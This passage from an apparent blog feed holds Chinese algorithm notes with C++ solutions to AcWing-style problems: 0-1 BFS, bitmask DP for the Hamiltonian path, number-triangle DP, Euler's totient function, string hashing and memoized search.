class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> inf =INT_MAX/<span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minimumObstacles</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = grid.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n =grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">dist</span>(m,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n,inf));<br>        deque&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;dq;<br>        dq.<span class="hljs-built_in">push_front</span>(&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;);<span class="hljs-comment">//起点放入队列</span><br>        dist[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] =<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(!dq.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-keyword">auto</span> [x,y] = dq.<span class="hljs-built_in">front</span>();<br>            dq.<span class="hljs-built_in">pop_front</span>();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>            &#123;<br>                <span class="hljs-type">int</span> nx= x+dx[i];<br>                <span class="hljs-type">int</span> ny = y+dy[i];<br>                <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;m &amp;&amp;ny&gt;=<span class="hljs-number">0</span> &amp;&amp;ny&lt;n)<br>                &#123;<br>                    <span class="hljs-type">int</span> w = grid[nx][ny];<span class="hljs-comment">//获取权值</span><br>                    <span class="hljs-keyword">if</span>(dist[x][y]+w&lt;dist[nx][ny])<span class="hljs-comment">//若存在更短路径则更新权值。</span><br>                    &#123;<br>                        dist[nx][ny] = dist[x][y]+w;<br>                        <span class="hljs-keyword">if</span>(w==<span class="hljs-number">0</span>)dq.<span class="hljs-built_in">push_front</span>(&#123;nx,ny&#125;);<span class="hljs-comment">//若权值为0放入队首，否则放入队尾。</span><br>                        <span class="hljs-keyword">else</span> dq.<span class="hljs-built_in">push_back</span>(&#123;nx,ny&#125;);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dist[m<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>状态压缩dp</title>
    <link href="/2022/05/21/%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9dp/"/>
    <url>/2022/05/21/%E7%8A%B6%E6%80%81%E5%8E%8B%E7%BC%A9dp/</url>
    
    <content type="html"><![CDATA[<p>状态压缩，用二进制数来表示状态，从而达到状态转移的目的。<br>例题,最短哈密尔顿路径。<br><a href="https://www.acwing.com/problem/content/93/">https://www.acwing.com/problem/content/93/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">20</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> M = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> inf  = INT_MAX/<span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> dp[M][N];<span class="hljs-comment">//状态为i，结尾为点j</span><br><span class="hljs-type">int</span> gra[N][N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;gra[i][j]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(dp,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dp);<br>    dp[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<span class="hljs-comment">//起点为1，没走过任何路程</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1</span>&lt;&lt;n;i++)<span class="hljs-comment">//枚举所有状态</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<span class="hljs-comment">//枚举所有结尾的点。</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>((i&gt;&gt;j) &amp;<span class="hljs-number">1</span>)<span class="hljs-comment">//状态i里面有j点，可以进行转移。</span><br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;n;k++)<span class="hljs-comment">//枚举转移点k</span><br>                &#123;<br>                    <span class="hljs-keyword">if</span>(((i-(<span class="hljs-number">1</span>&lt;&lt;j))&gt;&gt;k) &amp; <span class="hljs-number">1</span> )<span class="hljs-comment">//状态i必须包含转移点k</span><br>                    &#123;<br>                        dp[i][j] = <span class="hljs-built_in">min</span>(dp[i][j],dp[i-(<span class="hljs-number">1</span>&lt;&lt;j)][k]+gra[k][j]);<br>                        <span class="hljs-comment">//cout&lt;&lt;dp[i][j]&lt;&lt;&quot; &quot;;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,dp[(<span class="hljs-number">1</span>&lt;&lt;n)<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>动态规划分析法</title>
    <link href="/2022/05/16/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%88%86%E6%9E%90%E6%B3%95/"/>
    <url>/2022/05/16/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%88%86%E6%9E%90%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>y总的动态规划分析法。<br>总得来说，对于一个动态规划问题，可以分为两个方面进行分析，分别为状态表示和状态计算两部分。<br><strong>状态表示</strong>是对动态规划数组dp[i,j]进行分析，分为集合和属性，集合来分析我们的动态规划数组表示的是什么，属性即要从集合获得什么样属性的元素，如最大最小值。<br><strong>状态计算</strong>是根据问题进行具体分析状态dp[i,j]可以由什么状态转移而来从而获得状态转移方程。<br>例题：<br>数字三角形：<a href="https://www.acwing.com/problem/content/900/">https://www.acwing.com/problem/content/900/</a><br>分析：<br><img src="/upload/2022/05/image-506fa6c3ce6e42af9511147335f31c94.png" alt="image.png"><br><img src="/upload/2022/05/image-4b94506866434a91b1fb41e61862e6cb.png" alt="image.png"><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">505</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> inf = INT_MAX/<span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> a[N][N];<br><span class="hljs-type">int</span> dp[N][N];<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>     cin&gt;&gt;n;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>     &#123;<br>         <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br>         &#123;<br>             cin&gt;&gt;a[i][j];<br>         &#125;<br>     &#125;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++)<br>     &#123;<br>         <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=i+<span class="hljs-number">1</span>;j++)<br>         &#123;<br>             dp[i][j] =-inf;<span class="hljs-comment">//对边界进行处理</span><br>         &#125;<br>     &#125;<br>     dp[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = a[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>     &#123;<br>         <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br>         &#123;<br>             dp[i][j] = <span class="hljs-built_in">max</span>(dp[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+a[i][j],dp[i<span class="hljs-number">-1</span>][j]+a[i][j]);<br>         &#125;<br>     &#125;<br>     <span class="hljs-type">int</span> ans =-inf;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>     &#123;<br>         ans =<span class="hljs-built_in">max</span>(ans,dp[n][i]);<span class="hljs-comment">//找到最后一行的最大值</span><br>     &#125;<br>     cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>欧拉函数</title>
    <link href="/2022/05/10/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/"/>
    <url>/2022/05/10/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p><img src="/upload/2022/05/image-5a61da7fc0b8442bbbfe2c4873f1c101.png" alt="image.png"><br>特别的，当n&#x3D;1时，欧拉函数值为1。当n为质数时，欧拉函数的值为n-1。<br>欧拉函数直接求法：<br>模板：<a href="https://www.acwing.com/problem/content/875/">https://www.acwing.com/problem/content/875/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>        <span class="hljs-type">int</span> res=x;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=x/i;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(x%i==<span class="hljs-number">0</span>)<br>            &#123;<br>                res = (res/i)*(i<span class="hljs-number">-1</span>);<br>                <span class="hljs-keyword">while</span>(x%i==<span class="hljs-number">0</span>)x/=i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">1</span>) res =(res/x)*(x<span class="hljs-number">-1</span>); <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,res);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>筛法求欧拉函数:<br>模板：<a href="https://www.acwing.com/problem/content/876/">https://www.acwing.com/problem/content/876/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> prime[N];<br><span class="hljs-type">bool</span> st[N];<br><span class="hljs-type">int</span> phi[N];<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> cnt;<br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">getol</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    phi[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!st[i])<br>        &#123;<br>            prime[cnt++]=i;<br>            phi[i] = i<span class="hljs-number">-1</span>;<span class="hljs-comment">//i是质数，欧拉函数为i-1</span><br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;prime[j]&lt;=n/i;j++)<br>        &#123;<br>                st[prime[j]*i] =<span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">if</span>(i%prime[j]==<span class="hljs-number">0</span>)<br>                &#123;<br>                    phi[i*prime[j]] =prime[j]*phi[i];<br><span class="hljs-comment">//如果i%prime[j]为0，则prime[j]为i的质因数。</span><br><span class="hljs-comment">//prime[j]也必定为prime[j]*i的质因数。</span><br><span class="hljs-comment">//由欧拉函数公式，可推导出，phi[i*prime[j]] =prime[j]*phi[i];</span><br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                phi[i*prime[j]] = (prime[j]<span class="hljs-number">-1</span>)*phi[i];<br><span class="hljs-comment">//如果i%prime[j]不为0，则prime[j]不为i的质因数。</span><br><span class="hljs-comment">//prime[j]*i多了一个质因数，prime[j]。</span><br><span class="hljs-comment">//由欧拉函数公式，可推导出，phi[i*prime[j]] = (prime[j]-1)*phi[i]</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        ans+= phi[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,<span class="hljs-built_in">getol</span>(n));<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>字符串哈希</title>
    <link href="/2022/04/26/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%93%88%E5%B8%8C/"/>
    <url>/2022/04/26/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%93%88%E5%B8%8C/</url>
    
    <content type="html"><![CDATA[<p>字符串哈希，将字符串映射成为哈希值，从而达到快速比较求得子串的功能。<br>模板，注意(字符串从1开始存储)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br>ULL h[N], p[N]; <span class="hljs-comment">// h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64</span><br><span class="hljs-comment">// 初始化</span><br>p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i];<br>    p[i] = p[i - <span class="hljs-number">1</span>] * P;<br>&#125;<br><br><span class="hljs-comment">// 计算子串 str[l ~ r] 的哈希值</span><br><span class="hljs-function">ULL <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>例题（模板题）：<br><a href="https://www.acwing.com/problem/content/submission/843/">https://www.acwing.com/problem/content/submission/843/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>,P=<span class="hljs-number">131</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ull;<br>ull h[N],p[N];<br>string s;<br><span class="hljs-function">ull <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> h[r]-h[l<span class="hljs-number">-1</span>]*p[r-l+<span class="hljs-number">1</span>];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<br>    cin&gt;&gt;s;<br>    s = <span class="hljs-string">&quot;0&quot;</span>+s;<br>    p[<span class="hljs-number">0</span>] =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        p[i] = p[i<span class="hljs-number">-1</span>]*P;<br>        h[i]  = h[i<span class="hljs-number">-1</span>]*P +s[i];<br>    &#125;<br>    <span class="hljs-type">int</span> l1,r1,l2,r2;<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d%d&quot;</span>,&amp;l1,&amp;r1,&amp;l2,&amp;r2);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">get</span>(l1,r1)==<span class="hljs-built_in">get</span>(l2,r2))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Yes\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No\n&quot;</span>);<br>        &#125;<br>    &#125;<br>     <br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>记忆化搜索</title>
    <link href="/2022/04/21/%E8%AE%B0%E5%BF%86%E5%8C%96%E6%90%9C%E7%B4%A2/"/>
    <url>/2022/04/21/%E8%AE%B0%E5%BF%86%E5%8C%96%E6%90%9C%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<p>记忆化搜索理解：在暴力搜索的基础上，记录了搜索的状态，从别的状态搜索过来后不用再重复搜索，减少了时间复杂度。<br><a href="https://www.acwing.com/problem/content/903/">https://www.acwing.com/problem/content/903/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">301</span>;<br><span class="hljs-type">int</span> m[N][N];<br><span class="hljs-type">int</span> dp[N][N];<br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<br><span class="hljs-type">int</span> r,c;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">s</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> &amp;v = dp[x][y];<br>    <span class="hljs-keyword">if</span>(v!=<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> v;<br>    v =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> nx =x+dx[i];<br>        <span class="hljs-type">int</span> ny =y+dy[i];<br>        <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;r &amp;&amp; ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;c &amp;&amp; m[nx][ny]&lt;m[x][y])<br>        &#123;<br>            v=<span class="hljs-built_in">max</span>(v,<span class="hljs-built_in">s</span>(nx,ny)+<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> v;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;r,&amp;c);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;r;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;c;j++)<br>        &#123;<br>            <span class="hljs-built_in">scanf</span>(<span 